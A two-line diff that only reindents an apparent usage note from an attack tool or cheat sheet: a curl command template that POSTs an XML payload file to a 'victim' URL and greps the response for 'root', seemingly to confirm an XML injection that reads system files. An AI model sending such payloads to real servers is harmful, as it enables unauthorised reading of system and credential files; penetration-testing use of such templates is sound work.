@@ -1,2 +1,2 @@
-Payload: curl -H "Content-Type: text/xml" --data "@file_path_here" -i -X POST victim_here | grep your_keyword_here
-Example: curl -H "Content-Type: text/xml" --data "@payload1" -i -X POST https://www.buggyserver.com/buggypage.php | grep root*
+     Payload: curl -H "Content-Type: text/xml" --data "@file_path_here" -i -X POST victim_here | grep your_keyword_here
+     Example: curl -H "Content-Type: text/xml" --data "@payload1" -i -X POST https://www.buggyserver.com/buggypage.php | grep root*
